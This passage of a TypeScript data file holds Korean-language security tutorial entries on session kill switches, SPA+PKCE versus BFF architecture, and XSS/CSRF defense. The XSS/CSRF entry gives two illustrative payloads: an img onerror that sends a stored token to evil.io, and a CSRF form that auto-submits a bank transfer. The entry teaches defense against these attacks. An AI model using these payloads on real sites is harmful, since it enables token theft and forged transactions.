        description: '보안 침해 시 특정 사용자 또는 특정 디바이스의 모든 활성 세션을 즉각 파기하는 엔터프라이즈 모듈입니다.',
        code: `import { redisClient } from './redisClient';

export async function triggerUserKillSwitch(userId: string): Promise<number> {
  // 사용자의 모든 활성 세션 ID 인덱스 집합 조회
  const userSessionsKey = \`user_sessions:\${userId}\`;
  const sessionIds = await redisClient.smembers(userSessionsKey);

  if (sessionIds.length === 0) return 0;

  const pipeline = redisClient.pipeline();
  
  // 모든 세션 데이터 즉시 파기
  for (const sid of sessionIds) {
    pipeline.del(\`session:\${sid}\`);
  }
  // 유저 인덱스 삭제
  pipeline.del(userSessionsKey);

  await pipeline.exec();
  console.warn(\`[보안 경고] 사용자 \${userId}의 \${sessionIds.length}개 세션이 킬 스위치에 의해 즉시 동결되었습니다.\`);
  return sessionIds.length;
}`
      }
    ],
    securityChecklistIds: ['chk-bff-1', 'chk-bff-2', 'chk-csrf-1', 'chk-csrf-2'],
    relatedTermIds: ['token-relay', 'kill-switch', 'back-channel', 'client-types', 'csrf'],
    relatedTopicIds: ['keycloak-iam-overview', 'spa-pkce-direct', 'spa-vs-bff-comparison', 'xss-vs-csrf-defense']
  },
  {
    id: 'spa-vs-bff-comparison',
    slug: 'spa-vs-bff-comparison',
    title: 'Architecture Deep-Dive: SPA + PKCE vs BFF Pattern',
    koreanTitle: 'SPA + PKCE vs BFF 패턴 심층 비교 & 의사결정 가이드',
    category: 'Frontend Architecture',
    summary: '클라이언트 유형, 토큰 보관 위치, 브라우저 인증 수단, XSS/CSRF 취약점, 인프라 운영 복잡도까지 실무 아키텍처 선택의 모든 기준을 나란히 비교합니다.',
    overview: `프론트엔드 보안 아키텍처 수립 시 가장 빈번하게 격돌하는 주제는 '순수 프론트엔드 직접 OIDC(SPA + PKCE)'인가, 아니면 '전담 백엔드 프록시 계층(BFF + Token Relay)'인가입니다.
SPA + PKCE는 빠른 개발 속도와 단순한 인프라(정적 호스팅)를 제공하지만, 브라우저 메모리에 토큰이 머물러 XSS에 취약하고 새로고침 시 토큰 보존이 까다롭습니다.
반면 BFF 패턴은 브라우저에 토큰을 절대 노출하지 않는 궁극의 보안성과 세션 제어력(Kill Switch)을 제공하지만, 별도의 서버 운영 및 Redis HA 구성이라는 인프라 복잡도를 요구합니다.
시스템의 보안 등급(금융/개인정보 처리 vs 일반 B2C/사내 도구), 인프라 예산, 개발팀의 백엔드 운영 역량에 따른 합리적인 아키텍처 선택 기준을 확립해야 합니다.`,
    badges: ['Architecture Matrix', 'Trade-off Analysis', 'Decision Framework', 'Threat Modeling'],
    readingTimeMinutes: 8,
    diagramNodes: [
      { id: 'spa_arch', label: 'Option A: SPA + PKCE', subLabel: 'Public Client Direct', type: 'client', icon: 'Layout' },
      { id: 'bff_arch', label: 'Option B: BFF Pattern', subLabel: 'Confidential Client Relay', type: 'gateway', icon: 'ShieldCheck' },
      { id: 'iam', label: 'Central IAM (Keycloak)', subLabel: 'Common Auth Authority', type: 'auth', icon: 'Key' },
      { id: 'apis', label: 'Microservice APIs', subLabel: 'Resource Servers', type: 'server', icon: 'Server' }
    ],
    flowSteps: [
      {
        step: 1,
        title: '클라이언트 신뢰 등급 (Client Trust Level)',
        actor: 'Client (SPA)',
        target: 'Central IAM (Keycloak)',
        protocol: 'RFC 6749 Classification',
        action: 'SPA는 시크릿을 가질 수 없는 Public Client인 반면, BFF는 시크릿과 개인키로 보호받는 Confidential Client입니다.',
        description: 'BFF는 위조 불가능한 백채널 클라이언트 인증을 수행하여 토큰 발급의 신뢰성을 극대화합니다.',
        payloadExample: `SPA: Client Secret 없음 (PKCE 필수)
BFF: Client Secret 또는 mTLS 비대칭키 + PKCE 병행 (최고 등급 신뢰)`,
        securityNote: '시크릿 유출 시 치명적이므로 Public Client에서는 시크릿 사용이 엄격히 금지됩니다.',
        activeNodes: ['spa_arch', 'bff_arch', 'iam']
      },
      {
        step: 2,
        title: '토큰의 물리적 보관 위치 (Token Residence)',
        actor: 'Client (SPA)',
        target: 'Microservice APIs',
        protocol: 'In-Memory vs Redis Store',
        action: 'SPA는 브라우저 메모리에 토큰을 보관하고, BFF는 서버 측 Redis 세션 스토어에 토큰을 격리합니다.',
        description: '브라우저에는 오직 HttpOnly 쿠키만 남으므로 자바스크립트가 탈취할 수 있는 공격 표면이 근본적으로 제거됩니다.',
        payloadExample: `SPA 토큰 위치: window/React JS Memory State
BFF 토큰 위치: Redis Cluster ('session:xyz')`,
        securityNote: 'SPA에서 개발 편의를 위해 localStorage를 쓰는 순간 보안 등급이 최하위로 추락합니다.',
        activeNodes: ['spa_arch', 'bff_arch']
      },
      {
        step: 3,
        title: '주요 공격 표면 및 방어 초점 (Threat Surface)',
        actor: 'Client (SPA)',
        target: 'Microservice APIs',
        protocol: 'XSS vs CSRF Matrix',
        action: 'SPA는 XSS 공격 시 토큰 탈취에 집중 방어해야 하며, BFF는 HttpOnly 쿠키의 자동 전송 특성(CSRF)을 방어해야 합니다.',
        description: 'BFF는 SameSite 쿠키와 X-XSRF-TOKEN 헤더 검증으로 CSRF를 원천 차단할 수 있어 공격 통제가 훨씬 용이합니다.',
        payloadExample: `SPA 주요 위협: XSS 스크립트로 메모리/API 가로채기
BFF 주요 위협: 악성 사이트로부터의 CSRF 요청 위조`,
        securityNote: 'CSRF는 규격화된 헤더 검증으로 100% 방어 가능하지만, XSS는 방어 범위가 광범위합니다.',
        activeNodes: ['spa_arch', 'bff_arch', 'apis']
      }
    ],
    keyTakeaways: [
      '보안 최우선 환경(금융, 의료, B2B 핀테크): BFF 패턴이 사실상 글로벌 표준 권장 사항',
      '경량/고속 개발 환경(스타트업 MVP, 사내 관리도구): 인프라 오버헤드가 없는 SPA + PKCE가 생산성 우위',
      '모던 OAuth 2.1 추세: OAuth 워킹그룹은 브라우저 클라이언트에 BFF 패턴 도입을 강력히 권장',
      '하이브리드 전략: 프론트엔드가 Next.js/Nuxt.js인 경우 Route Handler/Server Action을 자연스러운 BFF 계층으로 활용'
    ],
    tradeOffs: {
      pros: [
        '체계적인 보안 평가 매트릭스를 기반으로 한 정량적 아키텍처 의사결정 가능',
        '팀 내 보안 담당자와 프론트엔드 개발자 간의 기술적 합의점 도출 용이'
      ],
      cons: [
        '모든 프로젝트에 획일적인 단 하나의 정답은 없으며, 조직 역량과 비용 제약에 따른 트레이드오프 수용 필요'
      ]
    },
    codeSnippets: [
      {
        id: 'decision-checklist',
        title: '아키텍처 선택 의사결정 매트릭스 알고리즘',
        filename: 'architectureDecision.ts',
        language: 'typescript',
        description: '프로젝트 요구사항을 입력받아 SPA와 BFF 중 최적의 패턴을 판정하는 로직입니다.',
        code: `export interface ProjectRequirements {
  isFintechOrStrictCompliance: boolean;
  hasDedicatedBackendTeam: boolean;
  needsInstantSessionRevocation: boolean; // Kill Switch 필수 여부
  infrastructureBudget: 'LOW' | 'MEDIUM' | 'HIGH';
}

export function recommendArchitecture(req: ProjectRequirements) {
  if (req.isFintechOrStrictCompliance || req.needsInstantSessionRevocation) {
    return {
      pattern: 'BFF (Backend for Frontend) Pattern',
      confidence: 95,
      reason: '금융/엄격 컴플라이언스 및 즉시 세션 취소(Kill Switch)는 BFF + Redis 스토어에서만 완벽히 충족됩니다.'
    };
  }

  if (req.infrastructureBudget === 'LOW' && !req.hasDedicatedBackendTeam) {
    return {
      pattern: 'SPA + PKCE Direct Integration',
      confidence: 85,
      reason: '서버 유지비용이 없으며 정적 S3/CDN 배포가 가능하므로 신속한 MVP 론칭에 적합합니다.'
    };
  }

  return {
    pattern: 'BFF Pattern (Recommended for long-term scalability)',
    confidence: 80,
    reason: '장기적인 보안성 향상과 마이크로서비스 확장성을 고려할 때 BFF 도입이 권장됩니다.'
  };
}`
      }
    ],
    securityChecklistIds: ['chk-pkce-1', 'chk-bff-1', 'chk-csrf-1', 'chk-xss-1'],
    relatedTermIds: ['client-types', 'pkce', 'token-relay', 'kill-switch', 'csrf', 'xss'],
    relatedTopicIds: ['spa-pkce-direct', 'bff-token-relay', 'xss-vs-csrf-defense']
  },
  {
    id: 'xss-vs-csrf-defense',
    slug: 'xss-vs-csrf-defense',
    title: 'XSS vs CSRF: Core Vulnerabilities & Enterprise Defense',
    koreanTitle: 'XSS vs CSRF 차이 및 엔터프라이즈 실무 방어 전략',
    category: 'Security & Defense',
    summary: '공격 원리와 목적의 근본적인 차이를 이해하고, 현대 프론트엔드 및 백엔드 계층에서 구축해야 할 계층적 심층 방어(Defense in Depth) 수칙을 정리합니다.',
    overview: `웹 보안의 양대 산맥인 XSS(Cross-Site Scripting)와 CSRF(Cross-Site Request Forgery)는 취약점의 발현 지점과 공격 목표가 완전히 다릅니다.
XSS는 '클라이언트 자바스크립트 실행 권한을 탈취하여 사용자의 데이터(토큰, 세션, 키입력)를 훔치는 공격'인 반면,
CSRF는 '공격자가 자바스크립트를 훔치지 못하더라도, 브라우저가 가진 인증된 세션(쿠키)을 이용해 사용자를 속여 서버에 원치 않는 행동을 강제 실행시키는 공격'입니다.
따라서 방어 전략 또한 달라집니다. XSS는 컨텍스트 기반 이스케이프, DOMPurify, 엄격한 CSP, 그리고 토큰의 메모리/HttpOnly 격리로 방어하며,
CSRF는 쿠키의 SameSite 속성과 프론트엔드가 요청 헤더에 직접 주입하는 CSRF Anti-Forgery Token(Double Submit Cookie 패턴)으로 방어합니다.`,
    badges: ['OWASP Top 10', 'CSP Level 3', 'SameSite Cookie', 'Double Submit CSRF', 'Defense in Depth'],
    readingTimeMinutes: 10,
    diagramNodes: [
      { id: 'attacker', label: 'Attacker / Malicious Site', subLabel: 'Phishing / Exploit', type: 'client', icon: 'AlertTriangle' },
      { id: 'victim_browser', label: "Victim's Browser", subLabel: 'Holds Cookies / DOM', type: 'client', icon: 'Globe' },
      { id: 'target_server', label: 'Vulnerable App Server', subLabel: 'State-Changing APIs', type: 'server', icon: 'Server' },
      { id: 'defense_layer', label: 'Defense: CSP & SameSite', subLabel: 'Browser & WAF Defense', type: 'gateway', icon: 'ShieldCheck' }
    ],
    flowSteps: [
      {
        step: 1,
        title: '공격 벡터의 차이: 스크립트 실행(XSS) vs 요청 위조(CSRF)',
        actor: 'Attacker / Malicious Site',
        target: "Victim's Browser",
        protocol: 'Malicious Payload Injection',
        action: 'XSS는 게시판 등에 악성 <script>를 삽입하여 실행시키고, CSRF는 피싱 사이트에서 피해자 브라우저로 몰래 요청을 쏘게 만듭니다.',
        description: 'XSS는 공격자의 코드가 피해자의 신뢰받는 도메인 컨텍스트 안에서 직접 실행되는 반면, CSRF는 외부 도메인에서 피해자의 권한만 빌려 쓰는 것입니다.',
        payloadExample: `// XSS 페이로드 예시:
<img src=x onerror="fetch('https://evil.io/steal?t=' + localStorage.getItem('token'))">

// CSRF 공격 폼 예시:
<form action="https://bank.com/api/transfer" method="POST">
  <input type="hidden" name="toAccount" value="attacker_account" />
  <input type="hidden" name="amount" value="1000000" />
</form><script>document.forms[0].submit();</script>`,
        securityNote: 'XSS는 클라이언트의 모든 것을 읽고 조작할 수 있으므로 CSRF보다 치명도가 훨씬 높습니다.',
        activeNodes: ['attacker', 'victim_browser']
      },
      {
        step: 2,
        title: 'XSS 방어 체계: 안전한 렌더링 & CSP Level 3',
        actor: "Victim's Browser",
        target: 'Defense: CSP & SameSite',
        protocol: 'HTTP Header & Sanitization',
        action: 'React의 기본 이스케이프와 DOMPurify를 활용하고, 강력한 Content Security Policy 헤더를 응답에 적용합니다.',
        description: "CSP의 script-src 'self' 지시문을 통해 외부 인라인 스크립트 실행을 브라우저 엔진 레벨에서 차단합니다.",
        payloadExample: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';`,
        securityNote: "dangerouslySetInnerHTML 사용 시 반드시 DOMPurify.sanitize()로 소독해야 합니다.",
        activeNodes: ['victim_browser', 'defense_layer']
      },
      {
        step: 3,
        title: 'CSRF 방어 체계: SameSite 쿠키 & X-XSRF-TOKEN',
        actor: 'Defense: CSP & SameSite',
        target: 'Vulnerable App Server',
        protocol: 'Double Submit Cookie Pattern',
        action: '인증 쿠키에 SameSite=Lax 또는 Strict를 지정하고, 프론트엔드가 자바스크립트로 읽을 수 있는 CSRF 토큰을 커스텀 헤더에 첨부하게 합니다.',
        description: '서버는 요청 헤더의 X-XSRF-TOKEN과 쿠키의 CSRF 토큰이 일치하는지 대조합니다. 서드파티 악성 사이트는 SOP(동일 출처 정책)에 의해 피해자의 도메인 쿠키를 읽을 수 없으므로 헤더를 위조할 수 없습니다.',
        payloadExample: `POST /api/transfer HTTP/1.1
Host: bank.com
Cookie: session=xyz; XSRF-TOKEN=c8996fb924...
X-XSRF-TOKEN: c8996fb924...  <-- 프론트엔드가 직접 주입`,
        securityNote: 'GET 요청은 오직 조회에만 사용하고, 상태를 변경하는 모든 요청(POST/PUT/DELETE)에 검증을 강제합니다.',
        activeNodes: ['defense_layer', 'target_server']
      }
    ],
    keyTakeaways: [
      'XSS는 신뢰를 배반당한 브라우저의 문제: 사용자 입력을 코드로 신뢰하여 발생',
      'CSRF는 맹목적인 브라우저 쿠키 자동 전송의 문제: 요청의 출처를 검증하지 않아 발생',
      'XSS가 뚫리면 CSRF 방어도 무력화: 공격자가 스크립트를 실행할 수 있으면 CSRF 토큰마저 읽어낼 수 있으므로 XSS 방어가 최우선',
      '현대 웹의 표준 방어선: SameSite=Lax 쿠키 기본화, React/Vue 자동 이스케이프, Strict CSP, 그리고 BFF 토큰 격리'
    ],
    tradeOffs: {
      pros: [
        '두 공격의 메커니즘을 명확히 구분함으로써 오버엔지니어링 없이 정확한 방어 기술 적용 가능',
        '보안 취약점 진단 및 모의 해킹 시 대응 보고서 작성에 명확한 표준 지침 제공'
      ],
      cons: [
        '엄격한 CSP 적용 시 외부 서드파티 스크립트(Google Analytics, 마케팅 트래커) 연동 시 허용 정책 관리 부담 발생'
      ]
    },
    codeSnippets: [
      {
        id: 'csrf-double-submit',
        title: 'Express + Axios Double Submit Cookie CSRF 방어 구현',
        filename: 'csrfProtection.ts',
        language: 'typescript',
        description: '프론트엔드와 백엔드가 함께 협력하는 커스텀 헤더 기반 CSRF 방어 코드입니다.',
        code: `// [백엔드] Express CSRF 발급 및 검증 미들웨어
import { Request, Response, NextFunction } from 'express';
import crypto from 'crypto';

export function csrfMiddleware(req: Request, res: Response, next: NextFunction) {
  // 1. 세션 시작 시 읽기 가능한 CSRF 토큰 쿠키 발급 (HttpOnly=false)
  if (!req.cookies['XSRF-TOKEN']) {
    const csrfToken = crypto.randomBytes(32).toString('hex');
    res.cookie('XSRF-TOKEN', csrfToken, {
      secure: true,
      sameSite: 'lax',
      path: '/'
    });
  }

  // 2. 상태 변경 메서드(POST, PUT, DELETE, PATCH) 대상 검증
  const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
  if (!safeMethods.includes(req.method)) {
    const headerToken = req.headers['x-xsrf-token'];
    const cookieToken = req.cookies['XSRF-TOKEN'];

    if (!headerToken || headerToken !== cookieToken) {
      return res.status(403).json({ error: 'CSRF Token 검증 실패: 유효하지 않은 요청입니다.' });
    }
  }

  next();
}

// [프론트엔드] Axios 인터셉터로 헤더 자동 주입
import axios from 'axios';

export const apiClient = axios.create({
  baseURL: '/api',
  withCredentials: true,
  xsrfCookieName: 'XSRF-TOKEN',
  xsrfHeaderName: 'X-XSRF-TOKEN',
});`
      },
      {
        id: 'xss-sanitizer',
        title: 'DOMPurify 기반 안전한 Rich Text 렌더링 컴포넌트',
        filename: 'SafeHtmlViewer.tsx',
        language: 'typescript',
        description: '부득이하게 HTML을 주입해야 할 때 XSS를 완벽 소독하는 React 컴포넌트입니다.',
        code: `import React from 'react';
import DOMPurify from 'dompurify';

interface SafeHtmlViewerProps {
  dirtyHtml: string;
  className?: string;
}

export const SafeHtmlViewer: React.FC<SafeHtmlViewerProps> = ({ dirtyHtml, className }) => {
  // 악성 태그(<script>, <iframe>, <object>, onerror 등) 완전 살균
  const cleanHtml = DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'code', 'pre', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

  return (
    <div 
      className={className} 
      dangerouslySetInnerHTML={{ __html: cleanHtml }} 
    />
  );
};`
      }
    ],
    securityChecklistIds: ['chk-xss-1', 'chk-xss-2', 'chk-csrf-1', 'chk-csrf-2'],
    relatedTermIds: ['xss', 'csrf', 'client-types', 'token-relay'],
    relatedTopicIds: ['bff-token-relay', 'spa-pkce-direct', 'spa-vs-bff-comparison']
  }
];
